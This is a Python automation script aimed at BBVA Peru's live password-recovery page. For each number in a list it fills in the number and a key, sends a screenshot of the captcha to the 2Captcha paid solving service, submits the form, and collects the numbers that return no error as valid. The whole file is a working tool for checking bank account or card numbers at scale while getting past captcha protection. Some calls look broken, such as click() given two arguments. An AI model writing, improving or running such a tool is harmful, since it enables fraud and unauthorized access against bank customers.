import pyautogui
from printy import printy
from time import sleep
import os
from twocaptcha import TwoCaptcha


URL = "https://www.bbva.pe/personas/olvido-contrasena.html"
inputNumeroImg = os.path.dirname(os.path.abspath(__file__)) + "\\img\\numeroInput.jpeg"
inputClaveImg = os.path.dirname(os.path.abspath(__file__)) + "\\img\\ClaveInput.jpeg"
ErrorImg= os.path.dirname(os.path.abspath(__file__)) + "\\img\\Error.jpeg"
ErrorCodigoImg= os.path.dirname(os.path.abspath(__file__)) + "\\img\\ErrorCodigo.jpeg"
SiguienteImg = os.path.dirname(os.path.abspath(__file__)) + "\\img\\Siguiente.jpeg"
CodigoInputImg = os.path.dirname(os.path.abspath(__file__)) + "\\img\\CodigoInput.jpeg"


def write_in_input(pos, text:str,wait:int):
    
    pyautogui.moveTo(pos)
 
    pyautogui.click(clicks=2)
    sleep(wait)
    pyautogui.write(text)
    sleep(wait)

def click(pos):
    pyautogui.moveTo(pos)
    pyautogui.click()

from twocaptcha import TwoCaptcha



def captchaSolver(image,key):
    solver = TwoCaptcha(key)
    id = solver.send(file=image)
    print(id)
    sleep(20)
    code = solver.get_result(id)
    print(code)
    return code



def check_numero(numeros : list[int],clave: str,API_KEY:str) -> None:
    validos_numeros: list[str] = []
    for numero in numeros:
        margen = 0
        Error =  pyautogui.locateAllOnScreen(ErrorImg,confidence=0.6) 
        ErrorCodigo =  pyautogui.locateAllOnScreen(ErrorCodigoImg,confidence=0.6)
        if Error or ErrorCodigo:
            margen = 40
            
        write_in_input((40,406+ margen),numero,0.5)
        sleep(1)
        write_in_input((121,570+ margen),clave,0.5)
        pyautogui.screenshot("test.jpg",region=(290,600, 270, 130))
        printy("sending to 2capcha","y")
        result = captchaSolver("./test.jpg",API_KEY)
        
        write_in_input((150,787+ margen),result,0.5)
        click(438,900+ margen)
        sleep(10)
        Error =  pyautogui.locateAllOnScreen(ErrorImg,confidence=0.6)
        if not Error :
            validos_numeros.append(numero)
            write_in_input((449,76),URL,0.5)
            sleep(10)
    return validos_numeros
    
    
 
  
    
    


"""
 for _ in range(20): 
            inputNumero = pyautogui.locateOnScreen(inputNumeroImg,confidence=.5)
            InputClave = pyautogui.locateOnScreen(inputClaveImg,confidence=0.8)
            if inputNumero and InputClave:
               break
            sleep(0.5) 
"""